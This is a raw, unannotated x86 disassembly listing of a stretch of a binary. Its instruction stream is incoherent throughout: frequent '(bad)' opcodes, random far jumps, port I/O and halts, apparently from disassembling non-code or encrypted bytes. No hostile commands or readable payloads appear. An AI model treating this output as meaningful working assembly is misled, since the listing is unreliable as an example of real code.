  416fc1:	test   eax,0xddb41241
  416fc6:	test   al,bh
  416fc8:	and    ecx,DWORD PTR [ecx]
  416fca:	or     BYTE PTR [edx],dh
  416fcc:	xor    al,0xc3
  416fce:	es cmc 
  416fd0:	mov    ecx,0x74000405
  416fd5:	fidivr WORD PTR [edx+0x1]
  416fd8:	mov    ch,dl
  416fda:	test   BYTE PTR [eax+edx*8-0x1b],cl
  416fde:	rol    BYTE PTR [ecx-0x30245c0],1
  416fe4:	jns    0x417007
  416fe6:	sub    BYTE PTR [eax],cl
  416fe8:	inc    esp
  416fe9:	out    dx,al
  416fea:	xor    ebp,DWORD PTR [edx-0xc]
  416fed:	test   ebx,ebx
  416fef:	add    dh,ah
  416ff1:	fst    QWORD PTR [ecx-0x19acd101]
  416ff7:	pop    ebx
	...
  417010:	add    BYTE PTR [esi+0x6f5301c9],dh
  417016:	or     DWORD PTR [edx],esi
  417018:	dec    edi
  417019:	sbb    DWORD PTR [eax-0x5f80af37],0xee4fcf9
  417023:	div    BYTE PTR [edi]
  417025:	push   es
  417026:	sahf   
  417027:	add    DWORD PTR [ebx+0x79c04b4],eax
  41702d:	mov    ah,0x12
  417030:	(bad)  
  417031:	ins    BYTE PTR es:[edi],dx
  417032:	inc    ecx
  417033:	(bad)  
  417035:	bnd jnp 0x416fdc
  417038:	iret   
  417039:	jnp    0x417079
  41703b:	jmp    0x416fd0
  41703d:	imul   edi,DWORD PTR [ecx+ebp*1+0x6231f407],0xffffffdf
  417045:	jne    0x41701f
  417047:	xlat   BYTE PTR ds:[ebx]
  417048:	test   bh,dl
  41704a:	shl    bh,1
  41704c:	ss add eax,0x6f0551c5
  417052:	dec    ecx
  417053:	iret   
  417054:	fwait
  417055:	outs   dx,DWORD PTR ds:[esi]
  417056:	inc    ecx
  417057:	shl    DWORD PTR [ecx+esi*1],cl
  41705a:	push   ecx
  41705b:	mov    edi,0xbdfcb77b
  417060:	pop    ecx
  417061:	sub    bh,al
  417063:	test   esi,0x43d92d07
  417069:	hlt    
  41706a:	and    DWORD PTR [edi-0x58ed0fa7],0x2c7befdb
  417074:	fadd   DWORD PTR [eax]
	...
  41708e:	jae    0x41708e
  417090:	popa   
  417091:	dec    ecx
  417092:	in     al,dx
  417093:	jl     0x4170c2
  417095:	or     BYTE PTR [esp+eax*1+0x1b6bd1e],ah
  41709c:	out    0xce,eax
  41709e:	pusha  
  41709f:	and    ebx,ebx
  4170a1:	pop    ecx
  4170a2:	hlt    
  4170a3:	(bad)
  4170a6:	in     al,0xc5
  4170a8:	shl    DWORD PTR [edi],cl
  4170aa:	in     al,0xc5
  4170ac:	pop    ss
  4170ad:	iret   
  4170ae:	out    0x2c,eax
  4170b0:	stc    
  4170b1:	inc    ebx
  4170b2:	hlt    
  4170b3:	int    0x1f
  4170b5:	jmp    0x417122
  4170b7:	into   
  4170b8:	pop    ds
  4170b9:	ret    0x4f0
  4170bc:	add    BYTE PTR [esi+ebx*1+0x74e96ad9],bl
  4170c3:	inc    edx
  4170c4:	adc    BYTE PTR [ecx+0x721052ba],bh
  4170ca:	sub    eax,0x7b9cfcfd
  4170cf:	leave  
  4170d0:	xor    BYTE PTR [esi],cl
  4170d2:	ins    DWORD PTR es:[edi],dx
  4170d3:	inc    edx
  4170d4:	adc    ch,BYTE PTR [ecx+0x74c081f7]
  4170da:	in     al,dx
  4170db:	or     eax,0xfffffff6
  4170de:	ds add al,0x89
  4170e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4170e2:	inc    edi
  4170e3:	sub    eax,edx
  4170e5:	cmc    
  4170e6:	div    DWORD PTR [ebx]
  4170e8:	xor    edx,eax
  4170ea:	out    dx,eax
  4170eb:	jmp    0x4f825b7
  4170f0:	jae    0x417109
	...
  41710a:	add    dl,ch
  41710c:	xchg   BYTE PTR [eax],cl
  41710e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41710f:	mov    dh,0x4
  417111:	push   esi
  417112:	mov    esi,0x2911ee1c
  417117:	lock or al,0x1b
  41711a:	mov    eax,ds:0x1c004444
  41711f:	sbb    DWORD PTR [edi+0x1b],edi
  417122:	mov    ecx,0x6000443e
  417127:	add    al,0xba
  417129:	leave  
  41712a:	sub    bh,al
  41712c:	jge    0x417149
  41712e:	mov    ch,0xa4
  417130:	inc    ebx
  417131:	add    BYTE PTR [edi+0x2adbbcec],ah
  417137:	lock lds edx,FWORD PTR [ebx+0x6e]
  41713b:	int3   
  41713c:	jmp    0x27391a52
  417141:	lahf   
  417142:	sub    eax,0x1200437e
  417147:	mov    bh,0x51
  417149:	sub    cl,al
  41714b:	pop    edi
  41714c:	push   ecx
  41714d:	inc    eax
  41714e:	add    BYTE PTR [ebp-0x40abee4a],bl
  417154:	inc    ecx
  417155:	add    BYTE PTR [ebx],bh
  417157:	into   
  417158:	sub    eax,0x2cc96811
  41715d:	inc    eax
  41715e:	add    BYTE PTR [ebp-0x4a],cl
  417161:	adc    DWORD PTR [eax-0x5cffbe81],ebp
  417167:	ror    DWORD PTR [edx-0x3db9ffc1],1
  41716d:	jno    0x417173
	...
  417187:	add    BYTE PTR [edi-0x19ea183f],ch
  41718d:	add    eax,0xe9770824
  417192:	cli    
  417193:	je     0x4171ce
  417195:	rcl    DWORD PTR [eax-0x1],1
  417198:	in     al,dx
  417199:	mov    bh,0xd0
  41719b:	div    DWORD PTR ds:0x85f7bddb
  4171a1:	sbb    eax,edx
  4171a3:	or     BYTE PTR ds:0xf5db2f14,bl
  4171a9:	aad    0xc5
  4171ab:	(bad)  
  4171ad:	add    BYTE PTR [ecx+0x36],dh
  4171b0:	sti    
  4171b1:	jbe    0x4171bb
  4171b3:	(bad)  
  4171b5:	add    BYTE PTR [esi-0x1],dl
  4171b8:	or     cl,bl
  4171ba:	cmovo  ecx,DWORD PTR ds:0x40c818f9
  4171c1:	inc    ebx
  4171c2:	add    BYTE PTR [ebp-0x1c],dh
  4171c5:	aas    
  4171c6:	sbb    eax,edx
  4171c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171c9:	inc    esi
  4171ca:	add    BYTE PTR [ecx+0x43c784c0],cl
  4171d0:	int    0x3f
  4171d2:	sbb    esp,ecx
  4171d4:	add    BYTE PTR [esi+0x0],0xc6
  4171d8:	fadd   DWORD PTR [eax+0x7cd43d9]
  4171de:	push   esi
  4171df:	push   esp
  4171e1:	shr    ch,0x11
  4171e4:	xor    al,0xae
  4171e6:	sub    ebx,DWORD PTR [edi+0x3ef7c4]
	...
  417204:	add    bh,bl
  417206:	out    dx,al
  417207:	push   esp
  417208:	sub    BYTE PTR [esi+edx*1],cl
  41720b:	push   ebp
  41720c:	inc    eax
  41720d:	hlt    
  41720e:	repnz hlt 
  417210:	push   ebx
  417211:	out    0x6d,al
  417213:	add    DWORD PTR [ecx],edi
  417215:	mov    bh,0x9a
  417217:	mul    BYTE PTR [edi-0x20]
  41721a:	mov    ds:0x12c40041,eax
  41721f:	cmc    
  417220:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417221:	push   es
  417222:	outs   dx,BYTE PTR ds:[esi]
  417223:	add    DWORD PTR [ecx+0x3ef744],esp
  417229:	pop    ds
  41722a:	out    dx,eax
  41722b:	push   esp
  41722c:	add    al,0x6
  41722e:	out    dx,al
  41722f:	(bad)  
  417230:	adc    edi,DWORD PTR [edi-0x6]
  417233:	daa    
  417234:	or     dh,cl
  417236:	adc    eax,0xbe1074cb
  41723b:	xor    ch,bh
  41723d:	in     eax,0xd2
  41723f:	mov    cl,0xf5
  417241:	dec    esp
  417242:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417243:	shl    ebp,0x3c
  417246:	out    0xc1,eax
  417248:	or     ah,dh
  41724a:	and    BYTE PTR [edi-0x14],dh
  41724d:	ja     0x4171d1
  41724f:	sbb    eax,0x4e36a356
  417254:	adc    BYTE PTR [edi-0x62],ch
  417257:	xchg   ch,bh
  417259:	adc    BYTE PTR [eax],0xdc
  41725c:	pop    edi
  41725d:	(bad)  
  41725e:	lods   al,BYTE PTR ds:[esi]
  41725f:	add    DWORD PTR [eax+esi*8],edi
  417262:	mov    edi,0x9a398b2d
  417267:	xor    DWORD PTR [esi+0x0],edx
	...
  417282:	int3   
  417283:	jae    0x417250
  417285:	std    
  417286:	shr    DWORD PTR [ecx],cl
  417288:	shl    DWORD PTR [ebx-0x10],0x4
  41728c:	sbb    esp,eax
  41728e:	int    0x3f
  417290:	push   0x4e
  417292:	in     al,dx
  417293:	add    al,0x62
  417295:	push   ss
  417296:	inc    eax
  417297:	sbb    esp,DWORD PTR [edi-0x59f2e1fd]
  41729d:	push   edi
  41729e:	out    dx,eax
  41729f:	pop    ebx
  4172a0:	ins    BYTE PTR es:[edi],dx
  4172a1:	inc    esi
  4172a2:	rcl    BYTE PTR [esi+esi*1+0x56],0xfc
  4172a7:	ret    
  4172a8:	adc    eax,0x6a10b080
  4172ad:	dec    esi
  4172ae:	lock add al,0x93
  4172b1:	(bad)  
  4172b2:	and    BYTE PTR [edx-0x3c3b5054],dl
  4172b8:	xchg   esp,eax
  4172b9:	jmp    FWORD PTR [eax-0x26]
  4172bc:	push   0xffffffc7
  4172be:	lock mov DWORD PTR [edx],esp
  4172c1:	push   edi
  4172c2:	in     eax,dx
  4172c3:	pop    ebx
  4172c4:	fs inc esi
  4172c6:	pop    eax
  4172c7:	push   esp
  4172c8:	call   0xa8f8:0xab8722cc
  4172cf:	xchg   ecx,eax
  4172d0:	and    al,0xd8
  4172d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172d3:	ret    
  4172d4:	pop    esp
  4172d5:	hlt    
  4172d6:	xor    dl,bl
  4172d8:	ret    0x7718
  4172db:	fbstp  TBYTE PTR [edx-0x3d]
  4172de:	icebp  
  4172df:	dec    ecx
  4172e0:	stos   BYTE PTR es:[edi],al
  4172e1:	xor    al,0x19
  4172e3:	cmp    ebx,esp
  4172e5:	retf   0x0
	...
  4172fc:	add    BYTE PTR [eax],al
  4172fe:	add    BYTE PTR [edi+0x912ae0c],al
  417304:	sbb    edi,edx
  417306:	cmc    
  417307:	ret    
  417308:	add    al,0x64
  41730a:	les    eax,FWORD PTR [eax+0x68cb6c9c]
  417310:	adc    al,0x64
  417312:	scas   eax,DWORD PTR es:[edi]
  417313:	pusha  
  417314:	adc    BYTE PTR [ecx],dl
  417316:	cld    
  417317:	inc    esp
  417318:	pop    edx
  417319:	jle    0x41730c
  41731b:	das    
  41731c:	sbb    eax,DWORD PTR [eax]
  41731e:	sub    eax,edi
  417320:	add    esp,0xffffffdd
  417323:	addr16 ret 0xc75e
  417327:	add    bh,0xc
  41732a:	jmp    0xb92dff33
  41732f:	jmp    0x4816:0xbee173bf
  417336:	(bad)  [edi]
  417338:	add    eax,0x39af4181
  41733d:	dec    esp
  41733e:	push   0xffffffcd
  417340:	sar    ch,0x6a
  417343:	nop
  417344:	adc    eax,0x528509bf
  417349:	push   0xffffffea
  41734b:	sbb    DWORD PTR [eax],ecx
  41734d:	push   0x8004f7e9
  417352:	push   cs
  417353:	lds    ecx,FWORD PTR [ebx+ecx*4]
  417356:	lods   al,BYTE PTR ds:[esi]
  417357:	cmp    ebp,DWORD PTR [ebp-0x3fd1020f]
  41735d:	test   BYTE PTR [ecx],ch
  41735f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417360:	and    DWORD PTR [edx-0x17],ebp
	...
  41737b:	add    BYTE PTR [ecx+0x3c5cfd04],ch
  417381:	cmc    
  417382:	fsubr  DWORD PTR [esp+esi*4-0x40]
  417386:	call   0xfe01b270
  41738b:	gs aaa 
  41738d:	cmp    DWORD PTR [esp+esi*2],ecx
  417390:	mov    ah,0xc0
  417392:	call   0xfe01a715
  417397:	jns    0x417391
  417399:	stos   DWORD PTR es:[edi],eax
  41739a:	or     bl,BYTE PTR [esp+esi*4-0x40]
  41739e:	call   0xfe01aefd
  4173a3:	(bad)  [edi]
  4173a5:	pop    esp
  4173a6:	(bad)  
  4173a7:	stos   DWORD PTR es:[edi],eax
  4173a8:	out    dx,eax
  4173a9:	rcl    DWORD PTR [edx+eiz*2-0x3d],0x83
  4173ae:	in     al,0x0
  4173b0:	jne    0x41733c
  4173b2:	in     al,dx
  4173b3:	sub    al,0x4e
  4173b5:	dec    ebp
  4173b6:	adc    al,0x0
  4173b8:	repz push esp
  4173ba:	jne    0x4173a4
  4173bc:	jmp    0x7205:0x19fffd32
  4173c3:	jo     0x41740d
  4173c5:	add    ah,BYTE PTR [eax+ecx*1]
  4173c8:	ins    DWORD PTR es:[edi],dx
  4173c9:	cli    
  4173ca:	out    0xb3,eax
  4173cc:	cmp    bh,cl
  4173ce:	sti    
  4173cf:	test   ch,cl
  4173d1:	push   ecx
  4173d2:	js     0x417357
  4173d4:	pop    eax
  4173d5:	mov    ebp,0xf9908afd
  4173da:	adc    eax,0xb519d40
  4173df:	push   0x0
	...
  4173f9:	test   esi,ecx
  4173fb:	jno    0x417405
  4173fd:	or     BYTE PTR [edx],al
  4173ff:	and    al,0x10
  417401:	lods   eax,DWORD PTR ds:[esi]
  417402:	into   
  417403:	(bad)  
  417404:	adc    DWORD PTR [ecx],0xffffffba
  417407:	cmp    BYTE PTR [ebp+0x69],0x5
  41740b:	je     0x41741c
  41740d:	xchg   DWORD PTR [ebp+0x3c5975fc],edi
  417413:	inc    esp
  417414:	and    al,0x25
  417416:	cmc    
  417417:	cli    
  417418:	(bad)  
  417419:	into   
  41741a:	les    ecx,FWORD PTR [ebx+eax*4]
  41741d:	cwde   
  41741e:	mov    eax,0x5f1a73fd
  417423:	or     bh,bh
  417425:	sar    BYTE PTR [eax-0x170ebb76],0x4f
  41742c:	inc    DWORD PTR [ebx-0x48f33b79]
  417432:	sar    ah,0x75
  417435:	and    DWORD PTR [edx],edi
  417437:	inc    esp
  417438:	and    al,0x25
  41743a:	cmc    
  41743b:	cli    
  41743c:	(bad)  
  41743d:	mov    es,esp
  41743f:	or     al,0x8d
  417441:	hlt    
  417442:	icebp  
  417443:	pop    ds
  417444:	or     BYTE PTR [ebx+edi*8-0x25],al
  417448:	fabs   
  41744a:	xchg   edi,eax
  41744c:	jmp    0x108eb354
  417451:	rol    ecx,cl
  417453:	cmc    
  417454:	cld    
  417455:	inc    ecx
  417456:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417457:	enter  0xc331,0xc1
  41745b:	xor    DWORD PTR [edx],edx
	...
  417475:	add    BYTE PTR [esi+ebp*4],dh
  417478:	rcr    al,1
  41747a:	pmaxsw mm1,mm6
  41747d:	fmul   DWORD PTR [edx+0x23]
  417480:	fstp   QWORD PTR [ebx-0x4a]
  417483:	fiadd  WORD PTR [ecx]
  417485:	push   0x1ae74
  41748a:	xchg   ebx,eax
  41748b:	sbb    BYTE PTR ds:0x1dd98b08,0x12
  417492:	xor    al,0xae
  417494:	enter  0xd074,0xa9
  417498:	enter  0x2013,0xbc
  41749c:	inc    ecx
  41749d:	add    BYTE PTR [ebx-0xa],ah
  4174a0:	jmp    0xf404:0xc5e66bbf
  4174a7:	cwde   
  4174a8:	jl     0x417496
  4174aa:	ja     0x4174b6
  4174ac:	lock cmp BYTE PTR [ecx-0x55ae374f],0x55
  4174b4:	test   BYTE PTR [eax],al
  4174b6:	hlt    
  4174b7:	lods   eax,DWORD PTR ds:[esi]
  4174b8:	pop    ebx
  4174b9:	add    DWORD PTR [esi-0xbffa656],ebx
  4174bf:	lods   eax,DWORD PTR ds:[esi]
  4174c0:	cmp    ebp,0x4376b5a9
  4174c6:	sbb    dh,dl
  4174c8:	mov    dl,0xf9
  4174ca:	adc    esi,DWORD PTR [edi+0x7d]
  4174cd:	rol    BYTE PTR [eax+0x43754d],0x5
  4174d4:	aaa    
  4174d5:	ja     0x41745e
  4174d7:	mov    ah,0x8f
  4174d9:	and    al,BYTE PTR [eax]
	...
  4174f3:	lock mov edi,0x38b47f96
  4174f9:	aaa    
  4174fa:	adc    eax,0xd023fdbd
  4174ff:	popa   
  417500:	dec    esi
  417501:	jb     0x417551
  417503:	les    esi,FWORD PTR [edx]
  417505:	in     al,0x82
  417507:	retf   0xe704
  41750a:	mov    ds:0xb2337f4,eax
  41750f:	pop    ds
  417510:	mov    ecx,0xb3ecffd6
  417515:	fld    QWORD PTR [edx+eax*2-0x53]
  417519:	ds sub eax,0x70bfa3
  41751f:	ffree  st(3)
  417521:	mov    bl,0x20
  417523:	and    eax,0x3afba492
  417528:	push   edi
  417529:	xchg   edi,eax
  41752a:	enter  0xc107,0x26
  41752e:	out    dx,al
  41752f:	aaa    
  417530:	adc    esp,DWORD PTR [edi-0x643b88fd]
  417536:	idiv   DWORD PTR [ecx+ecx*2-0x21]
  41753a:	or     al,0x3a
  41753c:	cmp    esp,ebp
  41753e:	jp     0x4174f1
  417540:	or     BYTE PTR [edx],dl
  417542:	out    0x50,eax
  417544:	idiv   esi
  417546:	in     al,0xae
  417548:	add    eax,0xc0b776e7
  41754d:	iret   
  41754e:	xor    bh,BYTE PTR ds:0x3412debf
  417554:	pop    esi
  417555:	xor    bh,BYTE PTR [ebp+0x0]
	...
  41756f:	add    BYTE PTR [esi],dh
  417571:	or     bh,ah
  417573:	jl     0x417576
  417575:	mov    fs,WORD PTR [esi]
  417577:	add    BYTE PTR [edi+0x49],ch
  41757a:	mov    ebx,0xbbcfdc
  41757f:	mov    dh,0x33
  417581:	je     0x417582
  417583:	shl    DWORD PTR [ecx],0x53
  417586:	mov    DWORD PTR [ebp-0xea47239],edx
  41758c:	neg    BYTE PTR [ecx+0x10]
  41758f:	bound  ebp,QWORD PTR [ebx+0xa81d18c]
  417595:	add    eax,0xc55be900
  41759a:	jae    0x417581
  41759c:	out    0xc4,al
  41759e:	jmp    0x74018f6b
  4175a3:	fnstcw WORD PTR [esi]
  4175a5:	clc    
  4175a6:	add    ah,bl
  4175a8:	mov    edi,0xe1ed73c1
  4175ad:	mov    edi,0xfe99a513
  4175b2:	jmp    FWORD PTR [ecx-0x4c]
  4175b5:	adc    DWORD PTR [ecx],edi
  4175b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175b8:	fwait
  4175b9:	cmp    BYTE PTR [ecx],al
  4175bb:	jo     0x417598
  4175bd:	or     BYTE PTR [ecx+0x5b5bd22f],cl
  4175c3:	sub    edi,DWORD PTR [esi+edi*4+0x53]
  4175c7:	jb     0x417569
  4175c9:	pop    eax
  4175ca:	cmp    DWORD PTR [edi+0x6221386f],esi
  4175d0:	and    dl,BYTE PTR [ecx]
  4175d2:	mov    ebp,DWORD PTR [eax+0x0]
	...
  4175ec:	add    BYTE PTR [edx],bh
  4175ee:	add    dl,0x7d
  4175f1:	pop    ebp
  4175f2:	mov    ecx,0x435cad0
  4175f7:	mov    edi,0x2ac3862
  4175fc:	bound  ebp,QWORD PTR [esi]
  4175fe:	pop    eax
  4175ff:	call   0xfdff7ecb
  417604:	gs aaa 
  417606:	cmp    DWORD PTR [ebx],eax
  417608:	pusha  
  417609:	mov    cl,0xc
  41760b:	mov    al,0xe8
  41760d:	ficomp DWORD PTR [esi-0x3f]
  417610:	add    bl,bh
  417612:	in     eax,dx
  417613:	xchg   al,bh
  417615:	cwde   
  417616:	(bad)  
  417617:	jno    0x417621
  417619:	cwde   
  41761a:	push   0x74
  41761c:	cmp    ch,ah
  41761e:	add    edi,esp
  417620:	mov    BYTE PTR ss:[edx+0x74],ch
  417624:	ss pusha 
  417626:	inc    DWORD PTR [ecx]
  417628:	test   DWORD PTR [ebp+0x71e82b4d],ebx
  41762e:	lock cld 
  417630:	jmp    DWORD PTR [esi-0x2e]
  417633:	xor    esi,0x30681dc9
  417639:	enter  0x1,0x57
  41763d:	push   esi
  41763e:	inc    esi
  41763f:	and    al,0x14
  417641:	jnp    0x41761c
  417643:	mov    edi,0x84c752eb
  417648:	ror    al,0xbb
  41764b:	push   ebx
  41764c:	call   0x3e6213
	...
  417669:	add    BYTE PTR [edi+0x420e7c1],bl
  41766f:	adc    esi,DWORD PTR [eax+0x65ac3601]
  417675:	xor    BYTE PTR [eax+0x1],cl
  417678:	add    BYTE PTR [edi-0x2e],dl
  41767b:	dec    ebp
  41767c:	and    al,0x14
  41767e:	add    eax,0x2ffec18
  417683:	test   edi,edx
  417685:	mov    dl,BYTE PTR ds:0xf3c092b7
  41768b:	jns    0x4176af
  41768d:	shl    DWORD PTR [edx-0x19],0xc1
  417691:	add    al,0x5d
  417693:	hlt    
  417694:	xchg   ah,ch
  417696:	into   
  417697:	aad    0x18
  417699:	adc    eax,0xffffffbc
  41769c:	std    
  41769d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41769f:	dec    ebp
  4176a0:	jmp    0xee73:0xd7f0f488
  4176a7:	inc    ecx
  4176a8:	std    
  4176a9:	push   edi
  4176aa:	xchg   edx,eax
  4176ab:	xor    al,0x3d
  4176ad:	call   0x6a2d4956
  4176b2:	loope  0x4176c7
  4176b4:	pop    edx
  4176b5:	adc    BYTE PTR [ebx],al
  4176b7:	clc    
  4176b8:	mul    DWORD PTR [ebp+0x6d]
  4176bb:	lock fisttp DWORD PTR [ebx-0x17cb76c7]
  4176c2:	in     al,0xf5
  4176c4:	add    BYTE PTR [eax],al
  4176c6:	dec    esi
  4176c7:	mov    cl,0x76
  4176c9:	inc    ebx
  4176ca:	int3   
  4176cb:	push   ds
  4176cc:	ret    
  4176cd:	jae    0x4176cf
	...
  4176e7:	cld    
  4176e8:	xchg   ebp,eax
  4176e9:	imul   bl
  4176eb:	retf   
  4176ec:	xor    eax,DWORD PTR [eax+0x5bc948c0]
  4176f2:	add    edx,0xffffffda
  4176f5:	lock or al,0x6b
  4176f8:	in     al,0x33
  4176fa:	std    
  4176fb:	and    DWORD PTR [esi+0x45ec73c4],edi
  417701:	into   
  417702:	jmp    0xc0c1baa2
  417707:	or     BYTE PTR [ecx+0x4734c010],ah
  41770d:	add    dh,BYTE PTR [ecx]
  41770f:	mov    ah,0xe5
  417711:	ror    DWORD PTR [esp+esi*8],0x5d
  417715:	add    edx,eax
  417717:	add    BYTE PTR [esi-0x5defbb88],ch
  41771d:	js     0x41776b
  41771f:	sbb    BYTE PTR [esi-0x361f76d5],ah
  417725:	stc    
  417726:	cld    
  417727:	or     ch,BYTE PTR [edi]
  417729:	les    ecx,FWORD PTR ds:0xdc12ea4
  41772f:	dec    esp
  417730:	ins    DWORD PTR es:[edi],dx
  417731:	cmp    bh,0x3b
  417734:	add    eax,0x4f84567
  417739:	cmp    eax,0xafb3f64f
  41773e:	rol    bh,0x8f
  417741:	mov    ebx,0x2c8dab32
  417746:	int3   
  417747:	jg     0x41778b
  417749:	mov    edi,0x33
	...
  417762:	add    BYTE PTR [eax],al
  417764:	pushf  
  417765:	cmp    DWORD PTR [esi],ecx
  417767:	inc    ebx
  417768:	hlt    
  417769:	sub    al,0x92
  41776b:	add    dh,ah
  41776d:	add    al,0xa6
  41776f:	dec    esi
  417770:	add    bl,al
  417772:	and    al,0xc8
  417774:	jmp    0x417730
  417776:	sbb    al,0xfc
  417778:	fcmovne st,st(5)
  41777a:	sub    DWORD PTR [edx],eax
  41777c:	hlt    
  41777d:	xchg   DWORD PTR [ebx-0x10394511],ebp
  417783:	add    ebx,DWORD PTR [esi+0x11]
  417786:	pusha  
  417787:	std    
  417788:	outs   dx,BYTE PTR ds:[esi]
  417789:	inc    edx
  41778a:	jecxz  0x4177e5
  41778c:	hlt    
  41778d:	push   esp
  41778e:	data16 out dx,al
  417790:	inc    ebx
  417791:	adc    esp,DWORD PTR [edi-0x1c3f8afd]
  417797:	jbe    0x4177d3
  417799:	sbb    eax,0xe507c4b7
  41779e:	fadd   DWORD PTR [ebx-0xc]
  4177a1:	(bad)  
  4177a2:	and    eax,0x439027c0
  4177a7:	js     0x4177e0
  4177a9:	or     DWORD PTR [edx-0x29],ebp
  4177ac:	fcom   QWORD PTR [edi+0x6a]
  4177af:	ret    
  4177b0:	inc    esp
  4177b1:	push   edx
  4177b2:	mov    dh,0x6
  4177b4:	xchg   esp,eax
  4177b5:	add    eax,0x83f103e7
  4177ba:	or     DWORD PTR [ebx],eax
  4177bc:	hlt    
  4177bd:	add    al,0x72
  4177bf:	ds cld 
  4177c1:	xchg   DWORD PTR [edi],esp
  4177c3:	(bad)  
  4177c4:	fst    QWORD PTR [eax]
  4177c6:	add    BYTE PTR [ecx+0x0],bl
	...
  4177e0:	add    BYTE PTR [esi+0x6f01f447],bh
  4177e6:	cmp    edi,edi
  4177e8:	call   0x415531b4
  4177ed:	push   cs
  4177ee:	inc    ebp
  4177ef:	add    BYTE PTR [edx+0x2c],ch
  4177f2:	or     BYTE PTR [ebx-0x427ef857],al
  4177f8:	jmp    0x7e297cf4
  4177fd:	push   0xffffffbb
  4177ff:	std    
  417800:	pusha  
  417801:	lods   eax,DWORD PTR ds:[esi]
  417802:	mov    esp,0xf544248b
  417807:	cmc    
  417808:	cmp    DWORD PTR [ecx-0x426e0fca],eax
  41780e:	mov    ch,bh
  417810:	xchg   esi,eax
  417811:	jno    0x417859
  417813:	cld    
  417814:	shr    BYTE PTR [ebp-0x4945fbca],cl
  41781a:	lods   al,BYTE PTR ds:[esi]
  41781b:	je     0x41788f
  41781d:	xor    eax,0xf27681a9
  417822:	add    DWORD PTR ss:[ebx],eax
  417825:	jmp    0x8aea:0xee673957
  41782c:	rol    DWORD PTR [esi],0x2f
  41782f:	adc    al,0x56
  417831:	fnsave [eax+0x5cfd4e51]
  417837:	push   ss
  417838:	test   eax,0xedc483f7
  41783d:	jl     0x417804
  41783f:	je     0x417825
  417841:	sub    eax,0x12c13a
	...
  41785e:	icebp  
  41785f:	add    al,0x0
  417861:	loop   0x417811
  417863:	aaa    
  417864:	loop   0x417878
  417866:	sti    
  417867:	and    esi,esi
  417869:	xor    bh,cl
  41786b:	add    al,0x0
  41786d:	jmp    0xb2cc:0x73b91c
  417874:	iret   
  417875:	test   DWORD PTR [edx-0xe],ecx
  417878:	sub    al,0x8b
  41787a:	nop
  41787b:	jp     0x4178fc
  41787d:	rcl    BYTE PTR [ecx-0x7a],0x78
  417881:	add    al,0x1e
  417883:	xchg   ebp,eax
  417884:	jo     0x417882
  417886:	ret    0x8724
  417889:	or     BYTE PTR [eax+0x41274c8],dl
  41788f:	push   esp
  417890:	clc    
  417891:	jbe    0x41789b
  417893:	mov    ebx,DWORD PTR [ecx-0x8]
  417896:	out    0xd7,al
  417898:	jge    0x417895
  41789a:	lea    edx,[edi+edx*2+0x424cbe00]
  4178a1:	add    eax,0xb6
  4178a6:	(bad)  
  4178a7:	fidiv  WORD PTR [edx-0x2b]
  4178aa:	push   esi
  4178ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178ac:	(bad)  gs:[esi+0x48000000]
  4178b3:	mov    edx,edi
  4178b5:	add    ebp,ebx
  4178b7:	add    eax,0x6e497589
  4178bc:	pop    ebx
  4178bd:	push   edi
  4178be:	int3   
  4178bf:	add    eax,0xc084
	...
  4178d8:	add    BYTE PTR [eax],al
  4178da:	add    al,dl
  4178dc:	sbb    bl,bh
  4178de:	jne    0x417929
  4178e0:	outs   dx,BYTE PTR ds:[esi]
  4178e1:	adc    DWORD PTR [eax-0x74],ebx
  4178e4:	add    eax,0x6e3d7589
  4178e9:	call   0x6ac0:0x32c73a87
  4178f0:	and    edx,DWORD PTR [edi-0x37]
  4178f3:	iret   
  4178f4:	or     DWORD PTR [eax],eax
  4178f6:	mov    edx,DWORD PTR [eax+0x79]
  4178f9:	mov    DWORD PTR [esi+ebx*2],esi
  4178fc:	dec    esi
  4178fd:	push   0x55cdb
  417902:	push   0xfffffff4
  417904:	stos   DWORD PTR es:[edi],eax
  417905:	push   edi
  417906:	std    
  417907:	add    DWORD PTR [edi+edx*1+0x40],edi
  41790b:	hlt    
  41790c:	mov    dl,0x77
  41790e:	inc    ebx
  41790f:	in     al,0x2e
  417911:	lds    ecx,FWORD PTR [ebx+ecx*2]
  417914:	adc    ebx,DWORD PTR [esi]
  417916:	rcl    BYTE PTR [edi],0x61
  417919:	mov    ecx,0x1b3bac6
  41791e:	xchg   DWORD PTR [edx-0xfbc7361],esi
  417924:	sti    
  417925:	mov    esi,0x8941ec73
  41792a:	inc    esi
  41792b:	std    
  41792c:	cs retf 0xa209
  417930:	jp     0x417947
  417932:	dec    esp
  417933:	jmp    0x84d7:0x308103eb
  41793a:	std    
  41793b:	cmc    
  41793c:	pop    ss
  41793d:	std    
  41793e:	out    0x0,eax
	...
  417958:	xchg   BYTE PTR [esi],ch
  41795a:	add    DWORD PTR [eax],eax
  41795c:	outs   dx,DWORD PTR ds:[esi]
  41795d:	sbb    eax,eax
  41795f:	push   ebp
  417960:	inc    edx
  417961:	xchg   BYTE PTR [ecx-0x2],bl
  417964:	sar    DWORD PTR [edi-0x7d],cl
  417967:	std    
  417968:	(bad)  
  417969:	scas   eax,DWORD PTR es:[edi]
  41796a:	jmp    0xf400:0x193c366
  417971:	add    ebx,DWORD PTR [eax]
  417973:	std    
  417974:	sub    DWORD PTR [edx-0x73],ebx
  417977:	test   bl,ah
  417979:	adc    edx,eax
  41797b:	std    
  41797c:	mov    ds:0x3c13c07e,eax
  417981:	mov    al,0x41
  417983:	add    BYTE PTR [edi-0x16],dh
  417986:	jae    0xc1d82140
  41798c:	push   cs
  41798d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41798e:	pusha  
  41798f:	cmp    BYTE PTR [edi-0x53],0x36
  417993:	or     al,0x73
  417995:	add    eax,0xc07dbf9c
  41799a:	bswap  edi
  41799c:	jb     0x417956
  41799e:	push   ss
  41799f:	mov    ?,WORD PTR [eax+edi*4]
  4179a2:	xchg   esp,eax
